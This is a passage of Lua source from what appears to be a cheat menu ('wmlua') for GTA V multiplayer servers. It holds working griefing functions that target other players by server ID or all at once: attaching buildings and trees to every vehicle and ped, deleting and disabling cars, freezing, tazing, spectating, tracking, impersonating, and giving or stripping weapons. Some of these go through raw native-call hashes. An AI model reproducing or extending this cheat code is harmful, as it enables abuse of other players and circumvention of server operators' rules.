                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all vehicles (" .. #cars .. ")")
                for i = 1, #cars do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(cars[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("ar_prop_ar_stunt_block_01a"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, cars[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Big Tube" then
                local cars = wmlua.N.GetEntList("CVehicle")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all vehicles (" .. #cars .. ")")
                for i = 1, #cars do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(cars[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("ar_prop_ar_tube_4x_crn_5d"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, cars[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "El Tree" then
                local cars = wmlua.N.GetEntList("CVehicle")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all vehicles (" .. #cars .. ")")
                for i = 1, #cars do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(cars[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("prop_tree_olive_cr2"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, cars[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "FIB N IAA" then
                local cars = wmlua.N.GetEntList("CVehicle")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all vehicles (" .. #cars .. ")")
                for i = 1, #cars do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(cars[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("dt1_05_damage_slod"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, cars[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Papi Money's Factory" then
                local cars = wmlua.N.GetEntList("CVehicle")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all vehicles (" .. #cars .. ")")
                for i = 1, #cars do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(cars[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("xs_combined2_dyst_longbuild_b_09"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, cars[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Custom" then
                local prop = wmlua.N.GetHashKey(wmlua.F.GetInput("Enter Model Name"))
                local cars = wmlua.N.GetEntList("CVehicle")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all vehicles (" .. #cars .. ")")
                for i = 1, #cars do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(cars[i]))
                    local obj = wmlua.N.SpawnObj(prop,x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, cars[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            end

        end)
    end

    function wmlua.F.MALObjPeds(p1)

        wmlua_Thread(function()
            
            if p1 == "Big Block" then
                local peds = wmlua.N.GetEntList("CPed")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all peds (" .. #peds .. ")")
                for i = 1, #peds do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(peds[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("ar_prop_ar_stunt_block_01a"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, peds[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Big Tube" then
                local peds = wmlua.N.GetEntList("CPed")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all peds (" .. #peds .. ")")
                for i = 1, #peds do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(peds[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("ar_prop_ar_tube_4x_crn_5d"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, peds[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "El Tree" then
                local peds = wmlua.N.GetEntList("CPed")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all peds (" .. #peds .. ")")
                for i = 1, #peds do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(peds[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("prop_tree_olive_cr2"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, peds[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "FIB N IAA" then
                local peds = wmlua.N.GetEntList("CPed")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all peds (" .. #peds .. ")")
                for i = 1, #peds do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(peds[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("dt1_05_damage_slod"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, peds[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Papi Money's Factory" then
                local peds = wmlua.N.GetEntList("CPed")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all peds (" .. #peds .. ")")
                for i = 1, #peds do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(peds[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("xs_combined2_dyst_longbuild_b_09"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, peds[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Custom" then
                local prop = wmlua.N.GetHashKey(wmlua.F.GetInput("Enter Model Name"))
                local peds = wmlua.N.GetEntList("CPed")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all peds (" .. #peds .. ")")
                for i = 1, #peds do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(peds[i]))
                    local obj = wmlua.N.SpawnObj(prop,x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, peds[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            end

        end)

    end

    function wmlua.F.MALObjObjs(p1)

        wmlua_Thread(function()
            
            if p1 == "Big Block" then
                local objs = wmlua.N.GetEntList("CObject")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all objs (" .. #objs .. ")")
                for i = 1, #objs do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(objs[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("ar_prop_ar_stunt_block_01a"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, objs[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Big Tube" then
                local objs = wmlua.N.GetEntList("CObject")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all objs (" .. #objs .. ")")
                for i = 1, #objs do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(objs[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("ar_prop_ar_tube_4x_crn_5d"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, objs[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "El Tree" then
                local objs = wmlua.N.GetEntList("CObject")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all objs (" .. #objs .. ")")
                for i = 1, #objs do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(objs[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("prop_tree_olive_cr2"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, objs[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "FIB N IAA" then
                local objs = wmlua.N.GetEntList("CObject")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all objs (" .. #objs .. ")")
                for i = 1, #objs do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(objs[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("dt1_05_damage_slod"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, objs[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Papi Money's Factory" then
                local objs = wmlua.N.GetEntList("CObject")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all objs (" .. #objs .. ")")
                for i = 1, #objs do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(objs[i]))
                    local obj = wmlua.N.SpawnObj(wmlua.N.GetHashKey("xs_combined2_dyst_longbuild_b_09"),x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, objs[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            elseif p1 == "Custom" then
                local prop = wmlua.N.GetHashKey(wmlua.F.GetInput("Enter Model Name"))
                local objs = wmlua.N.GetEntList("CObject")
                wmlua.F.EventLogInsert("[~b~WM~w~] Attaching " .. p1 .. " to all objs (" .. #objs .. ")")
                for i = 1, #objs do
                    local x,y,z = table.unpack(wmlua.N.GetEntityPos(objs[i]))
                    local obj = wmlua.N.SpawnObj(prop,x,y,z,true,true,false)
                    wmlua.N.AttachEntityToEntity(obj, objs[i], 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                end
            end

        end)

    end

    function wmlua.F.MALDisableCars()

        wmlua.F.CFS("wmlua.V.Mal_disabledcars")

    end

    function wmlua.F.MALDeleteCars()

        wmlua.F.CFS("wmlua.V.Mal_deletecars")

    end

    function wmlua.F.OTHSpectatePlayer(_asid)

        local isSpectating = wmlua.H.WMInvokeNative(0x048746E388762E11)

        if isSpectating then
            wmlua.N.RequestCollisionAtCoord(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()))
            wmlua.N.NetworkSetInSpectatorMode(false, wmlua.N.GetPlayerPed())
        else

            if _asid then
                for i = 1, #_asid do
                    if i == #_asid then
                        wmlua.V.pts = wmlua.F.SIDToPID(_asid[i])
                        wmlua.V.pts = wmlua.N.GetPlayerPed(wmlua.V.pts)
                        wmlua.N.RequestCollisionAtCoord(wmlua.N.GetEntityPos(wmlua.V.pts))
                        wmlua.N.NetworkSetInSpectatorMode(true, wmlua.V.pts)
                    end
                end
            else
                wmlua.V.pts = wmlua.F.GetInput("Enter Player Server Id")
                if string.lower(wmlua.V.pts) ~= "all" then wmlua.V.pts = wmlua.F.SIDToPID(wmlua.V.pts) end
                if wmlua.V.pts ~= -69 then
                    wmlua.V.pts = wmlua.N.GetPlayerPed(wmlua.V.pts)
                    wmlua.N.RequestCollisionAtCoord(wmlua.N.GetEntityPos(wmlua.V.pts))
                    wmlua.N.NetworkSetInSpectatorMode(true, wmlua.V.pts)
                else
                    wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 2000)
                end
            end

        end

    end

    wmlua.T.FrozenNerds = {}

    function wmlua.F.OTHFreezePlayer(_asid)

        if _asid then
            wmlua.V.count = 0
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.target = wmlua.N.GetPlayerPed(wmlua.V.target)
                if not wmlua.T.TableContains(wmlua.T.FrozenNerds, wmlua.V.target) then
                    wmlua.F.InsertToTable(wmlua.T.FrozenNerds, wmlua.V.target)
                    wmlua.V.count = wmlua.V.count + 1
                end
            end
            wmlua.F.EventLogInsert("[~b~WM~w~] Added " .. wmlua.V.count .. " players to the list")
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            wmlua.V.target = wmlua.N.GetPlayerPed(wmlua.V.target)
    
            if not wmlua.T.TableContains(wmlua.T.FrozenNerds, wmlua.V.target) then
                wmlua.F.InsertToTable(wmlua.T.FrozenNerds, wmlua.V.target)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player already in list", 2000)
            end
        end

    end

    function wmlua.F.OTHUnfreezePlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.count = 0
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.target = wmlua.N.GetPlayerPed(wmlua.V.target)
                if wmlua.T.TableContains(wmlua.T.FrozenNerds, wmlua.V.target) then
                    wmlua.F.table_removekey(wmlua.T.FrozenNerds, wmlua.V.target)
                    wmlua.V.count = wmlua.V.count + 1
                end
            end
            wmlua.F.EventLogInsert("[~b~WM~w~] Removed " .. wmlua.V.count .. " players from the list")
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            wmlua.V.target = wmlua.N.GetPlayerPed(wmlua.V.target)
    
            if wmlua.T.TableContains(wmlua.T.FrozenNerds, wmlua.V.target) then
                wmlua.F.table_removekey(wmlua.T.FrozenNerds, wmlua.V.target)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player is not in the list", 2000)
            end
        end

    end

    wmlua.V.PlayerToTrack = 0

    function wmlua.F.OTHTrackOther(_asid)

        if not wmlua.V.Oth_trackother then

            if _asid then
                for i = 1, #_asid do
                    if i == #_asid then
                        wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                        wmlua.V.tsid = wmlua.N.GetPlayerServerId(wmlua.V.target)
                        wmlua.V.PlayerToTrack = wmlua.V.target
                        wmlua.F.CFT("wmlua.V.Oth_trackother", "Track Player " .. wmlua.V.tsid)
                        wmlua.V.Oth_trackother = true
                    end
                end
            else
                wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
                if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
                wmlua.V.tsid = wmlua.N.GetPlayerServerId(wmlua.V.target)
                wmlua.V.PlayerToTrack = wmlua.V.target
                wmlua.F.CFT("wmlua.V.Oth_trackother", "Track Player " .. wmlua.V.tsid)
                wmlua.V.Oth_trackother = true
            end

        else

            wmlua.F.CFT("wmlua.V.Oth_trackother", "Track Player")
            wmlua.V.Oth_trackother = false

        end

    end

    function wmlua.F.OTHMorphIntoPlayer(_asid)

        if _asid then
            for i = 1, #_asid do 
                if i == #_asid then
                    wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                    local targetModel = wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed(wmlua.V.target))
                    local selfModel = wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed())
                    if targetModel ~= nil and tonumber(targetModel) ~= tonumber(selfModel) then
                        if wmlua.F.RequestMdl(targetModel) then
                            wmlua.N.SetPlayerModel(wmlua.N.PlayerId(), targetModel)
                            wmlua.N.SetModelAsNoLongerNeeded(targetModel)
                        end
                    end
                    wmlua.H.WMInvokeNative(0xE952D6431689AD9A, wmlua.N.GetPlayerPed(wmlua.V.target), wmlua.N.GetPlayerPed())
                end
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            if tonumber(wmlua.V.target) ~= -69 then
    
                local targetModel = wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed(wmlua.V.target))
                local selfModel = wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed())
    
                if targetModel ~= nil and tonumber(targetModel) ~= tonumber(selfModel) then
                    if wmlua.F.RequestMdl(targetModel) then
                        wmlua.N.SetPlayerModel(wmlua.N.PlayerId(), targetModel)
                        wmlua.N.SetModelAsNoLongerNeeded(targetModel)
                    end
                end
    
                wmlua.H.WMInvokeNative(0xE952D6431689AD9A, wmlua.N.GetPlayerPed(wmlua.V.target), wmlua.N.GetPlayerPed())
    
            end
        end

    end

    function wmlua.F.OTHGiveAllWeps(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                for k,v in ipairs(wmlua.T.Weapons) do
                    wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(v.spawncode), 5000, false, false)
                    wmlua_Schleep(0)
                end
            end
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id or all")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            wmlua_Thread(function()
    
                if wmlua.V.ptm == "all" then
    
                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do
    
                        for k,v in ipairs(wmlua.T.Weapons) do
                            wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(player), wmlua.N.GetHashKey(v.spawncode), 5000, false, false)
                            wmlua_Schleep(0)
                        end
    
                    end
    
                else
    
                    if tonumber(wmlua.V.ptm) ~= -69 then
    
                        for k,v in ipairs(wmlua.T.Weapons) do
                            wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(v.spawncode), 5000, false, false)
                            wmlua_Schleep(0)
                        end
    
                    else
    
                        wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
    
                    end
    
                end
    
            end)
        end

    end

    function wmlua.F.OTHRemoveAllWeps(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                for k,v in ipairs(wmlua.T.Weapons) do
                    wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(v.spawncode))
                    wmlua_Schleep(0)
                end
            end
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id or all")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            wmlua_Thread(function()
    
                if wmlua.V.ptm == "all" then
    
                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do
    
                        for k,v in ipairs(wmlua.T.Weapons) do
                            wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(player), wmlua.N.GetHashKey(v.spawncode))
                            wmlua_Schleep(0)
                        end
    
                    end
    
                else
    
                    if tonumber(wmlua.V.ptm) ~= -69 then
    
                        for k,v in ipairs(wmlua.T.Weapons) do
                            wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(v.spawncode))
                            wmlua_Schleep(0)
                        end
    
                    else
    
                        wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
    
                    end
    
                end
    
            end)
        end

    end

    function wmlua.F.OTHGiveWep(_asid)

        if _asid then
            wmlua.V.name = wmlua.F.GetInput("Enter Weapon Name")
            wmlua.V.ammo = tonumber(wmlua.F.GetInput("Enter Ammo Count"))
            if not string.find(wmlua.V.name, 'weapon_') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'weapon_' .. wmlua.V.name
            elseif string.find(wmlua.V.name, 'parachute') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'gadget_' .. wmlua.V.name
            end
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(wmlua.V.name), wmlua.V.ammo)
            end
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id or all")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            wmlua.V.name = wmlua.F.GetInput("Enter Weapon Name")
            wmlua.V.ammo = tonumber(wmlua.F.GetInput("Enter Ammo Count"))
    
            if not string.find(wmlua.V.name, 'weapon_') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'weapon_' .. wmlua.V.name
            elseif string.find(wmlua.V.name, 'parachute') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'gadget_' .. wmlua.V.name
            end
    
            wmlua_Thread(function()
                if wmlua.V.ptm == "all" then
                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do
                        wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(player), wmlua.N.GetHashKey(wmlua.V.name), wmlua.V.ammo)
                    end
                else
                    if tonumber(wmlua.V.ptm) ~= -69 then
                        wmlua.H.WMInvokeNative(0xBF0FD6E56C964FCB, wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(wmlua.V.name), wmlua.V.ammo)
                    else
                        wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
                    end
                end
            end)

        end

    end

    function wmlua.F.OTHRemoveWep(_asid)

        if _asid then
            wmlua.V.name = wmlua.F.GetInput("Enter Weapon Name")
            if not string.find(wmlua.V.name, 'weapon_') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'weapon_' .. wmlua.V.name
            elseif string.find(wmlua.V.name, 'parachute') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'gadget_' .. wmlua.V.name
            end
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(wmlua.V.name))
                wmlua_Schleep(0)
            end
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id or all")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            wmlua.V.name = wmlua.F.GetInput("Enter Weapon Name")
    
            if not string.find(wmlua.V.name, 'weapon_') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'weapon_' .. wmlua.V.name
            elseif string.find(wmlua.V.name, 'parachute') and not string.find(wmlua.V.name, 'gadget_') then
                wmlua.V.name = 'gadget_' .. wmlua.V.name
            end
    
            wmlua_Thread(function()
                if wmlua.V.ptm == "all" then
                    for _, player in ipairs(wmlua.N.GetActivePlayers()) do
                        wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(player), wmlua.N.GetHashKey(wmlua.V.name))
                    end
                else
                    if tonumber(wmlua.V.ptm) ~= -69 then
                        wmlua.N.RemovePedWeapon(wmlua.N.GetPlayerPed(wmlua.V.ptm), wmlua.N.GetHashKey(wmlua.V.name))
                    else
                        wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
                    end
                end
            end)
        end

    end

    function wmlua.F.OTHClearPedTasks(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(wmlua.V.ptm), true)
            end
            wmlua.F.EventLogInsert("[~b~WM~w~] " .. #_asid .. " Players tasks cleared", 3000)
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id or all")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            if wmlua.V.ptm == "all" then
                for _, player in ipairs(wmlua.N.GetActivePlayers()) do
                    wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(player), true)
                end
            else
                if tonumber(wmlua.V.ptm) ~= -69 then
                    wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(wmlua.V.ptm), true)
                else
                    wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
                end
            end
        end

    end

    function wmlua.F.OTHTazePlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.tpxyz = wmlua.N.GetEntBonePos(wmlua.N.GetPlayerPed(wmlua.V.ptm), 31086)
                wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz = table.unpack(wmlua.V.tpxyz)
                wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.tpx, wmlua.V.tpy + 0.2, wmlua.V.tpz, wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz, 0.0, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), false, true, 0.0)
            end
            wmlua.F.EventLogInsert("[~b~WM~w~] " .. #_asid .. " Players tazed", 3000)
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id or all")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            if string.lower(wmlua.V.ptm) == "all" then
                for _, player in ipairs(wmlua.N.GetActivePlayers()) do
                    wmlua.V.tpxyz = wmlua.N.GetEntBonePos(wmlua.N.GetPlayerPed(player), 31086)
                    wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz = table.unpack(tpxyz)
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.tpx, wmlua.V.tpy + 0.2, wmlua.V.tpz, wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz, 0.0, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), false, true, 0.0)
                    wmlua.F.EventLogInsert("[~b~WM~w~] All tazed", 3000)
                end
            else
                if tonumber(wmlua.V.ptm) ~= -69 then
                    wmlua.V.tpxyz = wmlua.N.GetEntBonePos(wmlua.N.GetPlayerPed(wmlua.V.ptm), 31086)
                    wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz = table.unpack(wmlua.V.tpxyz)
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.tpx, wmlua.V.tpy + 0.2, wmlua.V.tpz, wmlua.V.tpx, wmlua.V.tpy, wmlua.V.tpz, 0.0, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), false, true, 0.0)
                    wmlua.F.EventLogInsert("[~b~WM~w~] Player " .. wmlua.N.GetPlayerName(wmlua.V.ptm) .. " tazed", 3000)
                else
                    wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
                end
            end
        end


    end

    function wmlua.F.OTHTazePlayers()

        wmlua.F.CFS("wmlua.V.Mal_tazeplayers")

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_tazeplayers"]].active then
            wmlua.F.EventLogInsert("[~b~WM~w~] Taze all enabled", 3000)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Taze all disabled", 3000)
        end

    end

    function wmlua.F.OTHHealPlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.HCoords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.ptm))
                wmlua.V.HealPackage = wmlua.H.WMInvokeNative(0x673966A0C0FD7171, wmlua.N.GetHashKey("pickup_health_standard"), wmlua.V.HCoords.x, wmlua.V.HCoords.y, wmlua.V.HCoords.z + 1.0, 1, 100, wmlua.N.GetHashKey("pickup_health_standard"), 1, 0)
            end
            wmlua.F.EventLogInsert("[~b~WM~w~] " .. #_asid .. " Players given health", 3000)
        else
            wmlua.V.ptm = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.ptm) ~= "all" then wmlua.V.ptm = wmlua.F.SIDToPID(wmlua.V.ptm) end
            if tonumber(wmlua.V.ptm) ~= -69 then
                wmlua.V.HCoords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.ptm))
                wmlua.V.HealPackage = wmlua.H.WMInvokeNative(0x673966A0C0FD7171, wmlua.N.GetHashKey("pickup_health_standard"), wmlua.V.HCoords.x, wmlua.V.HCoords.y, wmlua.V.HCoords.z + 1.0, 1, 100, wmlua.N.GetHashKey("pickup_health_standard"), 1, 0)
                wmlua.F.EventLogInsert("[~b~WM~w~] Player given health", 3000)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.OTHArmorPlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.ptm = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.HCoords = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.ptm))
                wmlua.H.WMInvokeNative(0x673966A0C0FD7171, wmlua.N.GetHashKey("pickup_armour_standard"), wmlua.V.HCoords.x, wmlua.V.HCoords.y, wmlua.V.HCoords.z + 1.0, 1, 100, wmlua.N.GetHashKey("pickup_armour_standard"), 1, 0)
            end
